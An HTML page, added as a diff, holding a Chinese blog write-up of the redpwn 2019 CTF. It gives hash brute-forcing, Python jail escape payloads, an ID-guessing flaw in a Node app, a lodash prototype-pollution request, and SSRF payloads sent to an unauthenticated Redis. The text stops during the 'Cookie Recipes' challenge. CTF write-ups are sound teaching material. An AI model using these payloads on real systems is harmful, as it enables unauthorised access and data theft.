@@ -1,0 +1,1341 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans,en,default">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,web,Misc,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Six's Blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="redpwn writeup">
+<meta name="keywords" content="ctf,web,Misc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="redpwn writeup">
+<meta property="og:url" content="https://sy-yunyi.github.io/2019/09/12/redpwn-writeup/index.html">
+<meta property="og:site_name" content="Six&#39;s Blog">
+<meta property="og:description" content="redpwn writeup">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.loli.net/2019/08/22/LACYosIJWzQk8Ed.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/22/maOjpj.png">
+<meta property="og:updated_time" content="2019-09-12T03:18:34.484Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="redpwn writeup">
+<meta name="twitter:description" content="redpwn writeup">
+<meta name="twitter:image" content="https://i.loli.net/2019/08/22/LACYosIJWzQk8Ed.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://sy-yunyi.github.io/2019/09/12/redpwn-writeup/">
+
+
+
+
+
+  <title>redpwn writeup | Six's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Six's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Don't Be Evil</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-网络实验">
+          <a href="/categories/网络实验/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            网络实验
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-论文选读">
+          <a href="/categories/论文选读/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-bookmark"></i> <br>
+            
+            论文选读
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-安全笔记">
+          <a href="/categories/安全笔记/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sticky-note"></i> <br>
+            
+            安全笔记
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-非标准美食">
+          <a href="/categories/非标准美食" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-wheat"></i> <br>
+            
+            非标准美食
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-six不言">
+          <a href="/categories/SIX不言/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-quote-right"></i> <br>
+            
+            SIX不言
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://sy-yunyi.github.io/2019/09/12/redpwn-writeup/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Six">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Six's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">redpwn writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-12T00:00:00+08:00">
+                2019-09-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/09/12/redpwn-writeup/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/09/12/redpwn-writeup/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.6k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  7
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>redpwn writeup</p>
+<a id="more"></a>
+<h3 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h3><h4 id="superhash"><a href="#superhash" class="headerlink" title="superhash"></a>superhash</h4><p>10次hash，密码很短。</p>
+<p>遍历可打印字符，最终长度为1。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">hash = <span class="string">"CD04302CBBD2E0EB259F53FAC7C57EE2"</span></span><br><span class="line">alphabet = string.printable</span><br><span class="line"><span class="keyword">for</span> length <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">    print(<span class="string">"len:&#123;&#125;"</span>.format(length))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(alphabet,repeat = length):</span><br><span class="line">        s =<span class="string">''</span>.join(i)</span><br><span class="line">        <span class="keyword">for</span> cnt <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">            h = hashlib.new(<span class="string">"md5"</span>)</span><br><span class="line">            h.update(s.encode())</span><br><span class="line">            s = h.hexdigest().upper()</span><br><span class="line">        <span class="keyword">if</span> s == hash:</span><br><span class="line">            print(<span class="string">"found string:&#123;&#125;"</span>.format(<span class="string">''</span>.join(i)))</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<h4 id="Dunce-Crypto"><a href="#Dunce-Crypto" class="headerlink" title="Dunce Crypto"></a>Dunce Crypto</h4><p>凯撒密码，位移为7</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;I_d0nt_w4nt_t0_p4y_my_tax3s&#125;</span><br></pre></td></tr></table></figure>
+<p>某些网站解密，将<code>I</code> 变成了<code>i</code>。</p>
+<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="he-sed-she-sed"><a href="#he-sed-she-sed" class="headerlink" title="he sed she sed"></a>he sed she sed</h4><p>命令注入，<code>sed</code>替换字符</p>
+<h4 id="genericpyjail"><a href="#genericpyjail" class="headerlink" title="genericpyjail"></a>genericpyjail</h4><p>黑名单绕过，使用十六进制编码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(open(&apos;flag.txt&apos;).read()) =&gt; 7072696e74286f70656e2827666c61672e74787427292e72656164282929</span><br><span class="line">输入：</span><br><span class="line">&quot;7072696e74286f70656e2827666c61672e74787427292e72656164282929&quot;.decode(&apos;hex&apos;)</span><br></pre></td></tr></table></figure>
+<p>或者<strong>dictionary elements can be accessed by .get()</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit(getattr(locals().get(chr(95)*2+&apos;built&apos;+&apos;ins&apos;+chr(95)*2), &apos;op&apos;+&apos;en&apos;)(&apos;fl&apos;+&apos;ag.txt&apos;).read())</span><br></pre></td></tr></table></figure>
+<h4 id="genericpyjail2"><a href="#genericpyjail2" class="headerlink" title="genericpyjail2"></a>genericpyjail2</h4><p>python字符串格式化漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">raw_input((42).__class__.__base__.__subclasses__()[40](&apos;flag.txt&apos;).read())</span><br></pre></td></tr></table></figure>
+<h4 id="Tux-Trivia-Show"><a href="#Tux-Trivia-Show" class="headerlink" title="Tux Trivia Show"></a>Tux Trivia Show</h4><p>收集国家首都及美国州州府，然后编写自动提交答案的脚本即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> netcat <span class="keyword">import</span> Netcat</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">df = pd.read_csv(<span class="string">r"./guojia.csv"</span>)</span><br><span class="line"><span class="comment"># start a new Netcat() instance</span></span><br><span class="line">nc = Netcat(<span class="string">'chall.2019.redpwn.net'</span>,<span class="number">6001</span>)</span><br><span class="line">s  = nc.read().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">print(s)</span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(<span class="string">"out"</span> <span class="keyword">not</span> <span class="keyword">in</span> s):</span><br><span class="line">    s  = nc.read().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    print(s)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"of"</span> <span class="keyword">in</span> s:</span><br><span class="line">        s = s.split()</span><br><span class="line">        q = <span class="string">" "</span>.join(s[s.index(<span class="string">"of"</span>)+<span class="number">1</span>:])[:<span class="number">-1</span>]</span><br><span class="line">        print(q)</span><br><span class="line">        cap = df[df[<span class="string">"Country"</span>] == q][<span class="string">"City"</span>].values</span><br><span class="line">        print(cap)</span><br><span class="line">        <span class="keyword">if</span> len(cap)&gt;<span class="number">0</span>:</span><br><span class="line">            nc.write(cap[<span class="number">-1</span>].encode(<span class="string">"utf-8"</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"没有信息！"</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> s:</span><br><span class="line">        print(s)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Correct"</span> <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"INCORRECT"</span> <span class="keyword">in</span> s :</span><br><span class="line">        print(<span class="string">'错误'</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i = i + <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Here is your flag: flag&#123;TUX_tr1v1A_sh0w+m3st3r3d_:D&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="ghast"><a href="#ghast" class="headerlink" title="ghast"></a>ghast</h4><p>审计源码，发现账户被保存在一个ID为<code>ghast:0</code>的map中，并且数字是递增的。将其进行<code>base64</code>转换，并将等号去掉。此时因为管理员账户会首先被创建，所以管理员的ID为<code>ghast:0</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">let idIdx = 0</span><br><span class="line"></span><br><span class="line">const makeId = () =&gt; Buffer.from(`ghast:$&#123;idIdx++&#125;`).toString(&apos;base64&apos;).replace(/=/g, &apos;&apos;)</span><br><span class="line"></span><br><span class="line">const things = new Map()</span><br><span class="line"></span><br><span class="line">things.set(makeId(), &#123;</span><br><span class="line">  name: secrets.adminName,</span><br><span class="line">  // to prevent abuse, the admin account is locked</span><br><span class="line">  locked: true,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
+<p>在展示用户信息时，仅仅是做了ID的验证，所以我们可以通过访问<code>/ api / things / Z2hhc3Q6MA</code>查看管理员账户的信息。</p>
+<p>得到管理员账户的用户名。</p>
+<p>而访问<code>/api/flag</code>的验证有两个，首先查看用户的<code>locked</code>属性，之后验证用户名是否是管理员。</p>
+<p>所以我们需要创建一个具有管理员用户名且<code>locked</code>属性为<code>false</code>的用户。</p>
+<p>但是在注册页面是不允许创建与管理员名称相同的用户的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (body.name === secrets.adminName) &#123;</span><br><span class="line">  res.writeHead(403)</span><br><span class="line">  res.end(&apos;no&apos;)</span><br><span class="line">  return</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>但是我们发现在<code>/api/ghasts</code>中存在问题，这里也生成了ID 并且用户名没有进行验证，我们可以在这里创建一个与管理员用户名相同的用户，记录下来ID。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">if (req.url === &apos;/api/ghasts&apos; &amp;&amp; req.method === &apos;POST&apos;) &#123;</span><br><span class="line">  let body</span><br><span class="line">  try &#123;</span><br><span class="line">    body = JSON.parse(await rawBody(req, &#123;</span><br><span class="line">      limit: &apos;512kb&apos;,</span><br><span class="line">    &#125;))</span><br><span class="line">    if (typeof body.name !== &apos;string&apos; &amp;&amp; typeof body.content !== &apos;string&apos;) &#123;</span><br><span class="line">      throw 1</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; catch (e) &#123;</span><br><span class="line">    res.writeHead(400)</span><br><span class="line">    res.end(&apos;bad body&apos;)</span><br><span class="line">    return</span><br><span class="line">  &#125;</span><br><span class="line">  const id = makeId()</span><br><span class="line">  things.set(id, &#123;</span><br><span class="line">    name: body.name,</span><br><span class="line">    content: body.content,</span><br><span class="line">  &#125;)</span><br><span class="line">  res.writeHead(200)</span><br><span class="line">  res.end(id)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>将ID放入cookie，就可以访问<code>api/flag</code>。</p>
+<p>得到<code>flag{th3_AdM1n_ne3dS_A_n3W_nAme}</code>。</p>
+<h4 id="bluePrint"><a href="#bluePrint" class="headerlink" title="bluePrint"></a>bluePrint</h4><p>loadsh 版本过时，导致原型污染漏洞。<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">user_id = &quot;abc768760f69a9008a981a35145595c8&quot;</span><br><span class="line">url = &quot;http://172.18.217.34/make&quot;</span><br><span class="line"> </span><br><span class="line">r = requests.post(url, cookies=&#123;&quot;user_id&quot;: user_id&#125;, json=&#123;&quot;content&quot;:&quot;here&quot;,</span><br><span class="line">&quot;public&quot;:True, &quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;public&quot;: True&#125;&#125;&#125;)</span><br></pre></td></tr></table></figure></p>
+<p>执行后，刷新页面，得到<code>flag</code>。<br><img src="https://i.loli.net/2019/08/22/LACYosIJWzQk8Ed.png" alt="blue.png"></p>
+<h4 id="red-pwn-is"><a href="#red-pwn-is" class="headerlink" title="red-pwn-is"></a>red-pwn-is</h4><p>题目给出了一个输入，可以扫描输入的url，猜测存在SSRF，经过测试仅仅允许<code>http</code>协议，在使用其他协议时返回：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">only the http protocol is supported</span><br></pre></td></tr></table></figure></p>
+<p>开始没有什么思路，根据提示，<code>hint: red-pwn-is could be better thought of as red-is-pwn</code>，想到可能是<code>redis</code>的问题。</p>
+<p>感觉进行尝试，果然发现问题：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：http://127.0.0.1:6379  # 6379是redis的端口</span><br><span class="line">返回：</span><br><span class="line">debug response:</span><br><span class="line">-ERR wrong number of arguments for &apos;get&apos; command</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>在redid的默认配置中，会开放一个没有验证的TCP/6379端口，并且会尝试去解析处理每一次输入(直到超时或者输入’QUIT’命令退出)，对于那些不存在的命令，则会显示像”-ERR unknown command”这样的输出。</p>
+</blockquote>
+<p>通过这篇<a href="https://www.cnblogs.com/sevck/p/5805884.html" target="_blank" rel="noopener">文章</a>的介绍，了解了一些语法。</p>
+<ul>
+<li>everything is separated with new lines (here CRLF)</li>
+<li>a command starts with ‘<em>‘ and the number of arguments (“</em>1” + CRLF)</li>
+<li>then we have the arguments, one by one:<ul>
+<li>string: the ‘$’ character + the string size (“$4” + CRLF) + the string value (“TIME” + CRLF)</li>
+<li>integer: the ‘:’ character + the integer in ASCII (“:42” + CRLF)</li>
+</ul>
+</li>
+</ul>
+<p>来看一下服务器信息：<code>http://127.0.0.1:6379/%0d%0a*1%0d%0a$4%0d%0aINFO%0d%0a</code></p>
+<p>真实的payload为：<code>*1 $4 INFO</code>（<code>*1\r\n$4\r\nINFO\r\n</code>）。</p>
+<blockquote>
+<p>注意：每一个命令的结尾都应该是<code>\r\n</code>，进行URL编码后是<code>%0d%0a</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$-1</span><br><span class="line">$3300</span><br><span class="line"># Server</span><br><span class="line">redis_version:5.0.5</span><br><span class="line">redis_git_sha1:00000000</span><br><span class="line">redis_git_dirty:0</span><br><span class="line">redis_build_id:4d072dc1c62d5672</span><br><span class="line">redis_mode:standalone</span><br><span class="line">os:Linux 4.15.0-58-generic x86_64</span><br><span class="line">arch_bits:64</span><br><span class="line">multiplexing_api:epoll</span><br><span class="line">atomicvar_api:atomic-builtin</span><br><span class="line">gcc_version:8.3.0</span><br><span class="line">process_id:7</span><br><span class="line">run_id:c5011502c4e860969bc4ad0626022b3869082243</span><br><span class="line">tcp_port:6379</span><br><span class="line">uptime_in_seconds:1501</span><br><span class="line">uptime_in_days:0</span><br><span class="line">hz:10</span><br><span class="line">configured_hz:10</span><br><span class="line">lru_clock:6157889</span><br><span class="line">executable:/usr/src/app/redis-server</span><br><span class="line">config_file:/usr/local/etc/redis/redis.conf</span><br><span class="line"></span><br><span class="line"># Clients</span><br><span class="line">connected_clients:1</span><br><span class="line">client_recent_max_input_buffer:83</span><br><span class="line">client_recent_max_output_buffer:0</span><br><span class="line">blocked_clients:0</span><br><span class="line">....</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<p>读取<code>keys</code>值：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：*2\r\n$4\r\nKEYS\r\n$1\r\n*\r\n</span><br></pre></td></tr></table></figure></p>
+<p>编码为：<code>http://127.0.0.1:6379/%0d%0a*2%0d%0a$4%0d%0aKEYS%0d%0a$1%0d%0a*0d%0a</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">debug response:</span><br><span class="line">$-1</span><br><span class="line">*1</span><br><span class="line">$4</span><br><span class="line">flag</span><br><span class="line">-ERR unknown command `HTTP/1.1`, with args beginning with:</span><br></pre></td></tr></table></figure></p>
+<p>发现<code>flag</code>的<code>key</code>，尝试读取。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：*2\r\n$3\r\nGET\r\n$4\r\nflag\r\n</span><br></pre></td></tr></table></figure></p>
+<p>编码为：<code>http://127.0.0.1:6379/%0d%0a*2%0d%0a$3%0d%0aGET%0d%0a$4%0d%0aflag0d%0a</code></p>
+<p>得到<code>flag</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">debug response:</span><br><span class="line">$-1</span><br><span class="line">$28</span><br><span class="line">flag&#123;r3d_pWn_is_buT_n0T_pwN&#125;</span><br><span class="line">-ERR unknown command `HTTP/1.1`, with args beginning with:</span><br></pre></td></tr></table></figure></p>
+<h4 id="Cookie-Recipes"><a href="#Cookie-Recipes" class="headerlink" title="Cookie Recipes"></a>Cookie Recipes</h4><p>这个题目的脑洞有点大！</p>
+<p>首先发现一个输入框，页面源码也非常的简单。</p>
+<p>尝试进行注入，无果，没有发现有价值的东西。</p>
+<p>使用<code>dirb</code>爆破路径，发现<code>robots.txt</code>。</p>
+<p>访问，发现了提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /u0tiI6DJlA1Zj9n2irnB/*.txt</span><br></pre></td></tr></table></figure></p>
+<p>看着好像是一个路径，或许我们的<code>flag</code>就在这个路径里面，但是怎么获得这个路径呢？</p>
+<p>看一下官方的提示：<br><img src="https://s2.ax1x.com/2019/08/22/maOjpj.png" alt="maOjpj.png"></p>
+<p>看形式，像是字典中的一个词条。难道是利用字典来猜测？</p>
+<p>从GitHub上下载一个英语词典文档,<br><code>https://github.com/dwyl/english-words</code>。</p>
